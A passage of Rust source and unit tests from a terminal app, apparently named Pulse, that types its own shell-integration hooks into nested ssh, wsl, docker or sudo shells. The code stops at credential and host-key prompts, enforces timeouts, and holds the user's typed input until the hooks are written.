            InputRoute::FlushThenDeliver => {
                self.write_nesthook_payload_locked(
                    id,
                    w,
                    "the input held during the injection outgrew the hold",
                );
                true
            }
            _ => true,
        }
    }

    /// The injected shell announced itself (a nested-scope `init`). Marks
    /// the episode hooked; the re-establish engine's parked resume unblocks
    /// on the first nested `pre` right after.
    pub(super) fn nesthook_on_init(&self, id: Uuid, depth: usize) {
        let mut map = self.nesthooks.lock();
        let Some(e) = map.get_mut(&id) else { return };
        if e.depth != depth {
            return;
        }
        if matches!(e.phase, Phase::Hooked) {
            return;
        }
        e.phase = Phase::Hooked;
        log::info!(
            "terminal {id}: nested shell hooked (depth {depth}, opener {}) — blocks, cwd and CLI attribution now live inside it",
            e.opener
        );
        drop(map);
        // nested-death reinstate: the far side was REACHED. Only now is this
        // episode's death a dropped link rather than a failed command.
        if let Some(l) = self.nested_life.lock().get_mut(&id) {
            l.established = true;
        }
        // nested-death reinstate: the nested world is BACK and talking. Any
        // replay ladder this terminal was climbing has succeeded, so the next
        // death starts again at the first rung instead of inheriting an
        // hours-old backoff.
        if self.nested_retry.lock().remove(&id).is_some() {
            log::info!("terminal {id}: nested replay ladder reset — the nested shell is back");
        }
    }

    /// What `reestablish` needs before typing the inner-CLI resume.
    pub(super) fn nesthook_state(&self, id: Uuid) -> NestState {
        match self.nesthooks.lock().get(&id).map(|e| e.phase) {
            None => NestState::Absent,
            Some(Phase::Hooked) => NestState::Hooked,
            Some(_) => NestState::Pending,
        }
    }

    /// Take the terminal's writer and write the payload (see
    /// `write_nesthook_payload_locked`).
    fn send_nesthook_payload(&self, id: Uuid, why: &str) {
        let Some(writer) = self.sessions.lock().get(&id).map(|s| s.writer.clone()) else {
            self.cancel_nesthook(id, "session gone before the payload could be written");
            return;
        };
        let ok = {
            let mut w = writer.lock();
            self.write_nesthook_payload_locked(id, &mut **w, why)
        };
        if !ok {
            log::warn!(
                "terminal {id}: the PTY write failed mid-payload — the nested hook injection is abandoned"
            );
        }
    }

    /// Write the four tagged payload lines (echo already suppressed by the
    /// reader line), then any input held for the user, and move to
    /// `AwaitInit` — all with the writer held, so nothing can land between
    /// them. False only when a write failed (the entry is then dropped).
    ///
    /// The ERASE row is composed HERE, not at arm time: it targets the row
    /// the echoed reader line starts on, and that row can only be read off the
    /// mirror once the echo has actually landed — after any wrapping and any
    /// scrolling the terminal itself decided on.
    fn write_nesthook_payload_locked(
        &self,
        id: Uuid,
        w: &mut (dyn Write + Send),
        why: &str,
    ) -> bool {
        let (reader, rtt) = {
            let map = self.nesthooks.lock();
            match map.get(&id) {
                Some(NestHook {
                    inj,
                    phase: Phase::AwaitEcho { rtt, .. },
                    ..
                }) => (inj.reader.clone(), *rtt),
                // Already written (the pump and a held-input overflow can
                // race to here; the writer lock makes the second a no-op).
                _ => return true,
            }
        };
        let erase_row = self.nesthook_erase_row(id, &reader);
        let taken = self
            .nesthooks
            .lock()
            .get_mut(&id)
            .and_then(|e| e.take_payload(erase_row, Instant::now()));
        let Some((lines, held)) = taken else {
            return true;
        };
        log::info!(
            "terminal {id}: nested hook payload written — {why} (link {})",
            match rtt {
                Some(r) => format!("{}ms measured", r.as_millis()),
                None => "unmeasured".to_string(),
            }
        );
        if erase_row.is_none() {
            log::info!(
                "terminal {id}: the injected line stays visible — the mirror does not show it \
                 exactly where it was typed (wrapped off-screen, or the shell redrew)"
            );
        }
        let mut ok = lines.iter().all(|l| write_line(w, l));
        if ok && !held.is_empty() {
            ok = w.write_all(&held).is_ok() && w.flush().is_ok();
            log::info!(
                "terminal {id}: {} byte(s) of input held during the hook injection delivered after the payload",
                held.len()
            );
        }
        if !ok {
            self.nesthooks.lock().remove(&id);
        }
        ok
    }

    /// The injection engine, riding the 250ms flush tick beside
    /// `pump_reestablish`.
    pub(super) fn pump_nesthook(self: &Arc<Self>) {
        /// (id, phase-independent bookkeeping) rows read under one lock.
        type Row = (Uuid, Phase);
        let now = Instant::now();
        let rows: Vec<Row> = {
            let map = self.nesthooks.lock();
            if map.is_empty() {
                return;
            }
            map.iter().map(|(id, e)| (*id, e.phase)).collect()
        };
        for (id, phase) in rows {
            // A dead/asleep terminal ends the injection; its own relaunch
            // path re-arms from the re-established chain if one survives.
            let running = {
                let state = self.state.lock();
                state
                    .terminal(id)
                    .is_some_and(|t| t.status == TermStatus::Running && !t.asleep)
            };
            if !running {
                self.cancel_nesthook(id, "terminal is no longer running");
                continue;
            }
            match phase {
                Phase::AwaitQuiet {
                    armed,
                    last_len,
                    last_change,
                    answer_from,
                } => {
                    let len = self.journal_len(id).unwrap_or(last_len);
                    if len != last_len {
                        // ABSOLUTE DEADLINE FIRST. Re-basing the quiescence
                        // clock and `continue`ing skipped `open_action`
                        // entirely, so a shell that never stops printing
                        // (a tail -f, a chatty MOTD loop, a progress bar)
                        // parked the injection forever: OPEN_TIMEOUT is
                        // evaluated inside the very call the `continue`
                        // jumped over. Rebase, then still ask — with
                        // quiet_for = 0, which can only ever return
                        // Wait or AbortTimeout.
                        self.rebase_nesthook(id, len, now);
                        if growth_action(now.duration_since(armed)) == OpenAction::AbortTimeout
                        {
                            self.cancel_nesthook(
                                id,
                                "the nested shell never settled at a shell prompt",
                            );
                        }
                        continue;
                    }
                    let quiet_for = now.duration_since(last_change);
                    let settled = quiet_for >= OPEN_QUIET;
                    let alt = settled && self.terminal_is_alt(id);
                    let tail = if settled && !alt {
                        self.last_screen_line(id).unwrap_or_default()
                    } else {
                        String::new()
                    };
                    let cred = reestablish::credential_prompt_line(&tail);
                    // typed-ssh-nested: ONE definition of "that row is ssh's
                    // host-key question" — the composer's pre-shell auth
                    // classifier, reused verbatim (the same reuse discipline
                    // as `looks_like_shell_prompt` below).
                    let hostkey = matches!(
                        crate::gui::composer::detect_auth_prompt(&tail),
                        crate::gui::composer::AuthPrompt::HostKey
                    );
                    let at_prompt =
                        settled && !alt && !cred && !hostkey && self.cursor_row_is_prompt(id);
                    match open_action(
                        now.duration_since(armed),
                        quiet_for,
                        cred,
                        hostkey,
                        alt,
                        at_prompt,
                        answer_from.is_some(),
                    ) {
                        OpenAction::Wait | OpenAction::WaitForPrompt => {}
                        OpenAction::AbortCredential => self.cancel_nesthook(
                            id,
                            "a credential prompt is pending (hooks are never typed into one)",
                        ),
                        OpenAction::AbortHostKey => self.cancel_nesthook(
                            id,
                            "the remote host's key is waiting to be confirmed — that answer is yours alone (nothing was typed)",
                        ),
                        OpenAction::AbortAlt => self.cancel_nesthook(
                            id,
                            "a full-screen program owns the terminal (no prompt to inject at)",
                        ),
                        OpenAction::AbortTimeout => self.cancel_nesthook(
                            id,
                            "the nested shell never settled at a shell prompt",
                        ),
                        OpenAction::Send => self.send_nesthook_reader(id, len),
                    }
                }
                Phase::AwaitEcho { last_len, .. } => {
                    let len = self.journal_len(id).unwrap_or(last_len);
                    if len != last_len {
                        // ABSOLUTE DEADLINE FIRST — same defect, same shape:
                        // `echo_ready`'s deadline arm is documented to "fire
                        // even while output is still streaming", and the
                        // `continue` was the reason it never did. A shell
                        // parked in our `read` must never be left waiting.
                        // The first growth is also the link measurement.
                        self.rebase_nesthook(id, len, now);
                        let overdue = self
                            .nesthooks
                            .lock()
                            .get(&id)
                            .is_some_and(|e| e.echo_overdue(now));
                        if overdue {
                            self.send_nesthook_payload(id, "the echo never settled by the deadline");
                        }
                        continue;
                    }
                    // A snapshot, so the mirror can be asked with no
                    // injection lock held (it takes the sessions and term
                    // locks).
                    let Some(e) = self.nesthooks.lock().get(&id).cloned() else {
                        continue;
                    };
                    let due = e.echo_due(now, || self.nesthook_erase_row(id, &e.inj.reader).is_some());
                    if let Some(why) = due {
                        self.send_nesthook_payload(id, why);
                    }
                }
                Phase::AwaitInit { sent } => {
                    if now.duration_since(sent) >= INIT_TIMEOUT {
                        // Graceful skip: the shell family is one we do not
                        // hook (dash/fish/busybox), or `base64` was missing.
                        // The terminal is EXACTLY as it was — this is the
                        // honest degrade, not a silent one.
                        self.cancel_nesthook(
                            id,
                            "the nested shell never reported its hooks (unknown shell family, or no base64) — it stays unhooked",
                        );
                    }
                }
                Phase::Hooked => {}
            }
        }
    }

    /// Journal length helper (the quiescence clock both phases read).
    pub(super) fn journal_len(&self, id: Uuid) -> Option<u64> {
        self.journal(id).ok().map(|j| j.lock().absolute_len())
    }

    /// Does the mirror's cursor row READ as a shell prompt right now?
    ///
    /// Reuses `gui::composer::looks_like_shell_prompt` — the D2 heuristic
    /// composer's arm signal, validated against 20 real prompt shapes and 17
    /// adversarial negatives — so there is ONE definition of "that row is a
    /// prompt" in the product and this gate cannot drift from the lane the
    /// user sees. Field case it exists for: a brand-new account whose zsh
    /// runs `zsh-newuser-install`, a full-screen menu that settles quietly
    /// and then eats a typed line one keypress at a time.
    pub(super) fn cursor_row_is_prompt(&self, id: Uuid) -> bool {
        use alacritty_terminal::grid::Dimensions;
        use alacritty_terminal::index::{Column, Line};
        use alacritty_terminal::term::cell::Flags;
        let Some(term) = self.sessions.lock().get(&id).map(|s| s.term.clone()) else {
            return false;
        };
        let t = term.lock();
        let cursor = t.grid().cursor.point;
        let (row, col) = (cursor.line.0, cursor.column.0);
        if row < 0 || row as usize >= t.screen_lines() || col > t.columns() {
            return false;
        }
        let grid_row = &t.grid()[Line(row)];
        let mut prefix = String::with_capacity(col);
        for c in 0..col {
            let cell = &grid_row[Column(c)];
            if cell.flags.contains(Flags::WIDE_CHAR_SPACER) {
                continue;
            }
            prefix.push(cell.c);
        }
        drop(t);
        let trimmed = prefix.trim_end();
        let gap = prefix.chars().count() - trimmed.chars().count();
        crate::gui::composer::looks_like_shell_prompt(trimmed, gap)
    }

    /// The 1-based screen row the echoed reader line starts on, or `None`
    /// when the mirror does not show our line exactly where we typed it.
    ///
    /// The mirror IS the truth about what the terminal did — every wrap and
    /// every scroll is already folded into it — so asking it beats trying to
    /// reproduce the terminal's own layout arithmetic daemon-side.
    pub(super) fn nesthook_erase_row(&self, id: Uuid, reader: &str) -> Option<usize> {
        use alacritty_terminal::grid::Dimensions;
        use alacritty_terminal::index::{Column, Line};
        use alacritty_terminal::term::cell::Flags;
        if self.terminal_is_alt(id) {
            return None;
        }
        let term = self.sessions.lock().get(&id).map(|s| s.term.clone())?;
        let t = term.lock();
        let (cols, screen_rows) = (t.columns(), t.screen_lines());
        let cursor_row = t.grid().cursor.point.line.0;
        if cursor_row < 0 || cursor_row as usize >= screen_rows {
            return None;
        }
        let rows: Vec<String> = (0..=cursor_row as usize)
            .map(|r| {
                let row = &t.grid()[Line(r as i32)];
                let mut s = String::with_capacity(cols);
                for c in 0..cols {
                    let cell = &row[Column(c)];
                    if cell.flags.contains(Flags::WIDE_CHAR_SPACER) {
                        continue;
                    }
                    s.push(cell.c);
                }
                s
            })
            .collect();
        drop(t);
        erase_start_row(&rows, cursor_row as usize, reader).map(|r| r + 1)
    }

    /// Is a full-screen program on screen right now?
    pub(super) fn terminal_is_alt(&self, id: Uuid) -> bool {
        let term = self.sessions.lock().get(&id).map(|s| s.term.clone());
        term.is_some_and(|t| {
            t.lock()
                .mode()
                .contains(alacritty_terminal::term::TermMode::ALT_SCREEN)
        })
    }

    /// Output grew: re-base the quiescence clock for whichever phase is
    /// watching it. In phase 1 the growth may be the shell ANSWERING a line
    /// the user submitted (`answer_from`); in phase 2 the first growth is the
    /// echo coming back, which is both the proof and the link measurement.
    fn rebase_nesthook(&self, id: Uuid, len: u64, now: Instant) {
        if let Some(e) = self.nesthooks.lock().get_mut(&id) {
            e.on_growth(len, now);
        }
    }

    /// Phase 1 → 2: type the reader line — with the writer held, and only if
    /// nothing has changed since the pump decided to: no output since the
    /// journal length `seen` the decision was made on (the screen it judged
    /// is still the screen), and no input since (a partial line removed the
    /// entry; a submitted one set `answer_from`). Input takes the same lock
    /// to decide where it goes, so it cannot slip in between this check and
    /// the reader's bytes.
    fn send_nesthook_reader(&self, id: Uuid, seen: u64) {
        let Some(writer) = self.sessions.lock().get(&id).map(|s| s.writer.clone()) else {
            self.cancel_nesthook(id, "session gone before the hooks could be typed");
            return;
        };
        let typed = {
            let mut w = writer.lock();
            // Measured BEFORE the write: every byte after this is the echo.
            let len = self.journal_len(id).unwrap_or(seen);
            let now = Instant::now();
            let begun = self
                .nesthooks
                .lock()
                .get_mut(&id)
                .and_then(|e| e.begin_reader(seen, len, now).map(|r| (r, e.depth)));
            // None: input or output arrived since the decision (or the
            // injection is gone) — the next tick re-judges.
            let Some((reader, depth)) = begun else { return };
            log::info!("terminal {id}: injecting Pulse hooks into the nested shell (depth {depth})");
            if write_line(&mut **w, &reader) {
                true
            } else {
                self.nesthooks.lock().remove(&id);
                false
            }
        };
        if !typed {
            log::info!(
                "terminal {id}: nested hook injection stopped — the PTY write failed before the hooks could be typed"
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The arm gate: only a witnessed episode in an already-hooked, hook-fed,
    /// opted-in, non-pinned terminal within the depth cap ever injects.
    #[test]
    fn arm_gate_matrix() {
        assert_eq!(arm_verdict(true, true, true, false, 0), ArmVerdict::Arm);
        assert_eq!(arm_verdict(true, true, true, false, 3), ArmVerdict::Arm);
        assert_eq!(
            arm_verdict(false, true, true, false, 0),
            ArmVerdict::NotHooked,
            "a hookless spawn keeps its pre-nested behavior"
        );
        assert_eq!(
            arm_verdict(true, false, true, false, 0),
            ArmVerdict::WrongFamily,
            "pwsh/cmd never get a bash hook body typed at them"
        );
        // typed-ssh-nested: the SECOND argument is "the nested shell will
        // run in a POSIX world", which a crossing opener supplies even in a
        // pwsh terminal — this is the field-report case (a hooked local
        // PowerShell where the user typed `ssh 203.0.113.10`).
        use crate::daemon::tracker::crosses_to_posix;
        for opener in ["ssh 203.0.113.10", "wsl", "docker exec -it web bash"] {
            assert!(crosses_to_posix(opener), "{opener:?}");
            assert_eq!(
                arm_verdict(true, crosses_to_posix(opener), true, false, 0),
                ArmVerdict::Arm
            );
        }
        for opener in ["sudo su", "bash", "su - root"] {
            assert!(!crosses_to_posix(opener), "{opener:?}");
            assert_eq!(
                arm_verdict(true, crosses_to_posix(opener), true, false, 0),
                ArmVerdict::WrongFamily,
                "a local nested shell typed at a Windows prompt is still refused"
            );
        }
        assert_eq!(arm_verdict(true, true, false, false, 0), ArmVerdict::OptedOut);
        assert_eq!(
            arm_verdict(true, true, true, true, 0),
            ArmVerdict::PinnedKind,
            "a Claude-kind terminal's pin lifecycle owns it"
        );
        assert_eq!(
            arm_verdict(true, true, true, false, blocks::NESTED_TOKEN_MAX),
            ArmVerdict::TooDeep
        );
        // Precedence: the pinned/family refusals outrank everything, so a
        // pwsh terminal can never reach the depth arm by accident.
        assert_eq!(arm_verdict(false, false, false, true, 99), ArmVerdict::PinnedKind);
    }

    /// Phase 1 gating: quiescence gates every transition; the credential,
    /// alt-screen and prompt-shape checks fire only at the settled edge; the
    /// timeout wins.
    #[test]
    fn open_action_matrix() {
        let ms = Duration::from_millis;
        // (since_armed, quiet_for, credential, hostkey, alt, at_prompt)
        assert_eq!(open_action(ms(100), ms(100), false, false, false, true, false), OpenAction::Wait);
        assert_eq!(open_action(ms(600), ms(699), false, false, false, true, false), OpenAction::Wait);
        assert_eq!(open_action(ms(1000), ms(700), false, false, false, true, false), OpenAction::Send);
        // Credential abort — the reestablish predicate, reused verbatim.
        assert_eq!(
            open_action(ms(1000), ms(700), true, false, false, true, false),
            OpenAction::AbortCredential
        );
        assert!(reestablish::credential_prompt_line("[sudo] password for rig:"));
        // typed-ssh-nested: ssh's host-key question aborts too, and the
        // composer's auth classifier is the ONE definition of that row.
        assert_eq!(
            open_action(ms(1000), ms(700), false, true, false, true, false),
            OpenAction::AbortHostKey
        );
        use crate::gui::composer::{detect_auth_prompt, AuthPrompt};
        for row in [
            "Are you sure you want to continue connecting (yes/no/[fingerprint])?",
            "Are you sure you want to continue connecting (yes/no)?",
        ] {
            assert_eq!(detect_auth_prompt(row), AuthPrompt::HostKey, "{row:?}");
        }
        assert_eq!(
            detect_auth_prompt("rig@127.0.0.1's password:"),
            AuthPrompt::Password
        );
        assert_eq!(
            detect_auth_prompt("Enter passphrase for key '/home/z/.ssh/id_rig':"),
            AuthPrompt::Password
        );
        assert_eq!(detect_auth_prompt("rig@host:~$"), AuthPrompt::None);
        // A credential line outranks the host-key line (both abort anyway).
        assert_eq!(
            open_action(ms(1000), ms(700), true, true, false, true, false),
            OpenAction::AbortCredential
        );
        // Alt-screen outranks both (no prompt exists at all).
        assert_eq!(open_action(ms(1000), ms(700), true, false, true, true, false), OpenAction::AbortAlt);
        assert_eq!(open_action(ms(1000), ms(700), false, true, true, true, false), OpenAction::AbortAlt);
        assert_eq!(open_action(ms(1000), ms(700), false, false, true, true, false), OpenAction::AbortAlt);
        // Settled but NOT at a shell prompt (a wizard/menu/banner): keep
        // watching — never type a line into something that wants keypresses.
        assert_eq!(
            open_action(ms(1000), ms(700), false, false, false, false, false),
            OpenAction::WaitForPrompt
        );
        // ...and the classifier this gate delegates to agrees on the shapes
        // that matter here (one definition, shared with the composer lane).
        use crate::gui::composer::looks_like_shell_prompt as prompt;
        assert!(prompt("root@host:/home/rig#", 1), "a root prompt must pass");
        assert!(prompt("host%", 1), "a zsh prompt must pass");
        assert!(
            !prompt("--- Type one of the keys in parentheses ---", 1),
            "zsh-newuser-install's menu must never be typed into"
        );
        assert!(!prompt("Password:", 1));
        assert!(!prompt("", 0));
        // Timeout outranks everything, settled or not, prompt or not.
        assert_eq!(
            open_action(OPEN_TIMEOUT, ms(100), false, false, false, true, false),
            OpenAction::AbortTimeout
        );
        assert_eq!(
            open_action(OPEN_TIMEOUT + ms(1), ms(900), true, true, true, false, false),
            OpenAction::AbortTimeout
        );
    }

    /// The erase gate: our own echoed line is found EXACTLY where we typed
    /// it (wrapped or not), the real output above it is outside the region,
    /// and anything that is not byte-for-byte our line erases nothing.
    #[test]
    fn erase_gate_matrix() {
        let inj = bootstrap::nested_injection("cafebabe12345678");
        let reader = inj.reader.trim().to_string();
        let cols = 160usize;
        // Lay a prompt + our echo out the way a real grid holds it:
        // space-padded rows, wrapping at `cols`.
        let laid_out = |prompt: &str, line: &str| -> Vec<String> {
            let mut all: String = format!("{prompt}{line}");
            let mut out = Vec::new();
            while all.chars().count() > cols {
                let head: String = all.chars().take(cols).collect();
                all = all.chars().skip(cols).collect();
                out.push(head);
            }
            let pad = cols - all.chars().count();
            out.push(format!("{all}{}", " ".repeat(pad)));
            out
        };

        // Real output the user produced, ABOVE the prompt — must never be
        // inside the erased region.
        let mut rows = vec![format!("rig@host:~$ sudo su{}", " ".repeat(140))];
        let echo = laid_out("root@host:/home/rig# ", &reader);
        let prompt_row = rows.len();
        rows.extend(echo.clone());
        let cursor = rows.len() - 1;
        assert!(echo.len() > 1, "the reader line must actually wrap at 160 cols");
        assert_eq!(
            erase_start_row(&rows, cursor, &inj.reader),
            Some(prompt_row),
            "the erase must start at the PROMPT row, leaving the user's own line above it"
        );

        // Unwrapped (a very wide terminal) — same verdict, one row.
        let wide = vec![
            "rig@host:~$ sudo su".to_string(),
            format!("root@host:/home/rig# {reader}    "),
        ];
        assert_eq!(erase_start_row(&wide, 1, &inj.reader), Some(1));

        // zsh's line editor drops our leading space: still exactly our line.
        let zsh = vec![format!("host% {}", reader)];
        assert_eq!(erase_start_row(&zsh, 0, &inj.reader), Some(0));

        // A line that is NOT ours erases nothing — including one that merely
        // starts the same way, and one with our text plus a trailing edit.
        let near = reader.replace("__pulse_b", "__pulse_X");
        assert_eq!(
            erase_start_row(&[format!("root@host:~# {near}")], 0, &inj.reader),
            None,
            "a near-miss must render untouched"
        );
        assert_eq!(
            erase_start_row(&["root@host:~# stty -echo 2>/dev/null".to_string()], 0, &inj.reader),
            None,
            "a user's own `stty -echo` must render untouched"
        );
        assert_eq!(
            erase_start_row(&[format!("root@host:~# {reader}; echo hi")], 0, &inj.reader),
            None,
            "text printed after our line means the region is no longer only ours"
        );
        assert_eq!(
            erase_start_row(&["root@host:~# ls -la".to_string()], 0, &inj.reader),
            None,
            "ordinary output erases nothing"
        );

        // The top of the echo already scrolled off: the visible tail alone
        // must NOT be treated as the whole line (an erase could not reach the
        // scrolled-away rows anyway).
        let tail_only: Vec<String> = echo[1..].to_vec();
        let n = tail_only.len();
        assert_eq!(
            erase_start_row(&tail_only, n - 1, &inj.reader),
            None,
            "a partially scrolled-off echo must decline the erase"
        );

        // Degenerate inputs decline rather than panic.
        assert_eq!(erase_start_row(&[], 0, &inj.reader), None);
        assert_eq!(erase_start_row(&wide, 99, &inj.reader), None);
        assert_eq!(erase_start_row(&wide, 1, "   "), None);

        // ...and the payload line the gate feeds: a row the shell formats
        // itself, no row an empty one (nothing is erased).
        let row = |r| {
            let mut i = inj.clone();
            i.erase_row = r;
            i.payload_lines()[3].clone()
        };
        assert_eq!(row(Some(7)), format!("{}7", bootstrap::NESTED_TAGS[3]));
        assert_eq!(row(None), bootstrap::NESTED_TAGS[3]);
    }

    /// User input during phase 1: a SUBMITTED line keeps the injection
    /// waiting (its output re-bases the settle clock and the next prompt is
    /// still safe); PARTIAL typing abandons it (our line would be appended
    /// to the user's half-typed command).
    /// astra fix 4a: TIMEOUTS MUST NOT FAIL OPEN UNDER CONTINUOUS OUTPUT.
    /// Both injection phases used to re-base their quiescence clock on
    /// journal growth and `continue` PAST the decision that owns the
    /// absolute deadline - so a nested world that never stops printing could
    /// hold the injection open indefinitely. The growth path now asks the
    /// deadline FIRST, with quiet_for = 0.
    #[test]
    fn growth_ticks_still_enforce_the_absolute_deadline() {
        let ms = Duration::from_millis;
        // Inside the window a growth tick just waits (nothing else can fire:
        // every settled-edge signal is false while output is still moving).
        assert_eq!(growth_action(ms(0)), OpenAction::Wait);
        assert_eq!(growth_action(OPEN_TIMEOUT - ms(1)), OpenAction::Wait);
        // At the deadline it aborts, no matter how loud the output is.
        assert_eq!(growth_action(OPEN_TIMEOUT), OpenAction::AbortTimeout);
        assert_eq!(growth_action(OPEN_TIMEOUT + ms(5000)), OpenAction::AbortTimeout);
        // Phase 2's companion: the payload deadline fires while output
        // streams, so a shell parked in our `read` is never left waiting.
        for rtt in [None, Some(ms(300))] {
            assert!(!echo_ready(ECHO_DEADLINE_MIN - ms(1), Duration::ZERO, rtt, false));
            assert!(echo_ready(ECHO_DEADLINE_MIN, Duration::ZERO, rtt, false));
        }
        let t0 = Instant::now();
        let mut e = in_reads(t0);
        e.on_growth(200, t0 + ms(100));
        assert!(!e.echo_overdue(t0 + ECHO_DEADLINE_MIN - ms(1)));
        assert!(e.echo_overdue(t0 + ECHO_DEADLINE_MIN), "a growth tick still enforces the deadline");
    }

    /// A fresh entry for `inj`, armed at `t0` with the journal at 100.
    fn armed(t0: Instant) -> NestHook {
        NestHook::new(1, bootstrap::nested_injection("cafebabe12345678"), "ssh host", 100, t0)
    }

    /// An entry whose reader was typed at `t0` (journal at 100).
    fn in_reads(t0: Instant) -> NestHook {
        let mut e = armed(t0);
        assert!(e.begin_reader(100, 100, t0).is_some());
        e
    }

    /// DEFECT 1 (field: `wan600-02`, rig-reproduced at 600ms RTT). The
    /// payload must wait for PROOF — the reader's echo coming back — and
    /// silence before that proves nothing. v0.1.14-21 fired on 250ms of
    /// silence: at 600ms RTT that is before the reader has even reached the
    /// far end, so the mirror could not vouch for the line (it stayed on
    /// screen) and on a loaded host the payload was echoed too.
    #[test]
    fn a_slow_link_waits_for_the_echo_before_the_payload() {
        let ms = Duration::from_millis;
        let t0 = Instant::now();
        let mut e = in_reads(t0);
        // 600ms RTT: nothing comes back for 600ms. Every tick in that window
        // must wait, however quiet — the old rule fired on the first one.
        for t in [250, 500, 599] {
            assert_eq!(e.echo_due(t0 + ms(t), || true), None, "fired blind at {t}ms");
        }
        // The echo lands: that is the proof AND the link measurement.
        e.on_growth(450, t0 + ms(600));
        assert!(matches!(e.phase, Phase::AwaitEcho { rtt: Some(r), .. } if r == ms(600)));
        // ...and it must settle before the payload goes.
        assert_eq!(e.echo_due(t0 + ms(600) + ECHO_QUIET - ms(1), || true), None);
        assert_eq!(
            e.echo_due(t0 + ms(600) + ECHO_QUIET, || true),
            Some("the reader's echo came back and settled")
        );
        // The deadline grew with the link: 8 round trips, clamped.
        assert_eq!(echo_deadline(None), ECHO_DEADLINE_MIN, "nothing gets shorter");
        assert_eq!(echo_deadline(Some(ms(600))), ECHO_DEADLINE_MIN);
        assert_eq!(echo_deadline(Some(ms(1500))), ms(12000));
        assert_eq!(echo_deadline(Some(Duration::from_secs(60))), ECHO_DEADLINE_MAX);
    }

    /// The echo came back but the mirror does not vouch for it (a redrawn or
    /// scrolled line): the shell still demonstrably has the line, so the
    /// payload goes after a longer settle — never before the echo, and never
    /// later than the deadline. No echo at all: the deadline, and only it.
    #[test]
    fn an_unvouched_echo_settles_longer_and_no_echo_waits_for_the_deadline() {
        let ms = Duration::from_millis;
        let t0 = Instant::now();
        let mut e = in_reads(t0);
        e.on_growth(450, t0 + ms(100));
        assert_eq!(e.echo_due(t0 + ms(100) + ECHO_QUIET, || false), None);
        assert_eq!(e.echo_due(t0 + ms(100) + ECHO_QUIET_UNVOUCHED - ms(1), || false), None);
        assert_eq!(
            e.echo_due(t0 + ms(100) + ECHO_QUIET_UNVOUCHED, || false),
            Some("the reader's echo came back (the mirror does not vouch for it)")
        );
        // A slow link's unvouched settle is at least one measured round trip.
        let mut slow = in_reads(t0);
        slow.on_growth(450, t0 + ms(1500));
        assert_eq!(slow.echo_due(t0 + ms(1500) + ECHO_QUIET_UNVOUCHED, || false), None);
        assert!(slow.echo_due(t0 + ms(3000), || false).is_some());
        // Never an echo: only the deadline releases the shell from `read`.
        let silent = in_reads(t0);
        assert_eq!(silent.echo_due(t0 + ECHO_DEADLINE_MIN - ms(1), || true), None);
        assert_eq!(
            silent.echo_due(t0 + ECHO_DEADLINE_MIN, || true),
            Some("no echo came back by the deadline")
        );
        // The mirror is not even asked before the echo has been seen.
        let unasked = in_reads(t0);
        assert_eq!(unasked.echo_due(t0 + ms(400), || panic!("asked the mirror blind")), None);
    }

    /// The input router: phase 1 submitted ⇒ deliver and await the answer;
    /// phase 1 partial ⇒ abandon; phase 2 ⇒ hold (up to the cap).
    #[test]
    fn input_route_table() {
        use InputRoute::*;
        use InputWindow::*;
        for submitted in [false, true] {
            assert_eq!(input_route(Open, submitted, 10), Deliver);
            assert_eq!(input_route(InReads, submitted, 10), Hold);
            assert_eq!(input_route(InReads, submitted, HOLD_CAP), Hold);
            assert_eq!(input_route(InReads, submitted, HOLD_CAP + 1), FlushThenDeliver);
        }
        assert_eq!(input_route(BeforeReader, true, 10), DeliverAwaitAnswer);
        assert_eq!(
            input_route(BeforeReader, false, 10),
            DeliverAbandon,
            "half-typed input must abandon — never concatenate onto the user's line"
        );
    }

    /// What the remote shell does with a byte stream that starts with our
    /// reader line, following `NESTED_READER` (whose text the bootstrap
    /// goldens pin): the lines its `read`s consume, the body string it
    /// evaluates, and what is left for the shell's next prompt.
    fn remote_reads(stream: &str) -> (Vec<String>, String, String) {
        let tags = bootstrap::NESTED_TAGS;
        let reader = bootstrap::nested_injection("cafebabe12345678").reader;
        let rest = stream.strip_prefix(&format!("{reader}\r")).expect("the reader goes first");
        let mut lines = rest.splitn(5, '\r').map(str::to_string);
        let mut read = vec![lines.next().unwrap_or_default()];
        if read[0].starts_with(tags[0]) {
            read.extend((0..3).map(|_| lines.next().unwrap_or_default()));
        }
        let ours = read.len() == 4 && read.iter().zip(tags).all(|(l, t)| l.starts_with(t));
        let body = if ours {
            format!("{}{}", &read[0][tags[0].len()..], &read[1][tags[1].len()..])
        } else {
            String::new()
        };
        let left = rest.splitn(read.len() + 1, '\r').nth(read.len()).unwrap_or("").to_string();
        (read, body, left)
    }

    /// DEFECT 2. Input typed while the shell is parked in the injection's
    /// reads is HELD and written after the payload, so the reads consume only
    /// Pulse's lines and the user's command reaches the shell intact,
    /// afterwards. The stream below is built the way `Core` writes it: input
    /// the router says to deliver is written at once (between the reader and
    /// the payload, if that is when it arrived); held input after the payload.
    /// Delivering it at once — the race v0.1.14-21 left open between its
    /// notification and its write — puts the user's line into `read`, shifts
    /// the payload, and (before the tag gate) evaluated the result.
    #[test]
    fn input_during_the_reads_is_held_and_follows_the_payload() {
        let ms = Duration::from_millis;
        let t0 = Instant::now();
        let mut e = armed(t0);
        let reader = e.begin_reader(100, 100, t0).expect("typed");
        let mut stream = format!("{reader}\r");
        let typed: [&[u8]; 3] = [b"echo TYPED_$((6*7))\r", b"ls -la", b"\r"];
        for (i, bytes) in typed.iter().enumerate() {
            let submitted = bytes.last() == Some(&b'\r');
            match e.route_input(bytes, submitted, Some(100), t0 + ms(10 * i as u64)) {
                InputRoute::Hold => {}
                InputRoute::Deliver | InputRoute::DeliverAwaitAnswer => {
                    stream.push_str(std::str::from_utf8(bytes).unwrap())
                }
                other => panic!("unexpected route {other:?}"),
            }
        }
        e.on_growth(450, t0 + ms(600));
        assert!(e.echo_due(t0 + ms(900), || true).is_some());
        let (lines, held) = e.take_payload(Some(12), t0 + ms(900)).expect("payload");
        for l in &lines {
            stream.push_str(l);
            stream.push('\r');
        }
        stream.push_str(std::str::from_utf8(&held).unwrap());

        let (read, body, left) = remote_reads(&stream);
        assert_eq!(read, lines.to_vec(), "the reads must consume exactly Pulse's four lines");
        assert_eq!(body, e.inj.bash_b64, "the evaluated body must be Pulse's own");
        assert_eq!(
            left, "echo TYPED_$((6*7))\rls -la\r",
            "the user's input must reach the shell intact, in order, after the payload"
        );
        assert!(matches!(e.phase, Phase::AwaitInit { .. }));
        // Once the payload is out, input flows straight through.
        assert_eq!(e.route_input(b"x", false, Some(500), t0 + ms(950)), InputRoute::Deliver);
    }

    /// The tag gate, on the stream a desync produces (a user line between the
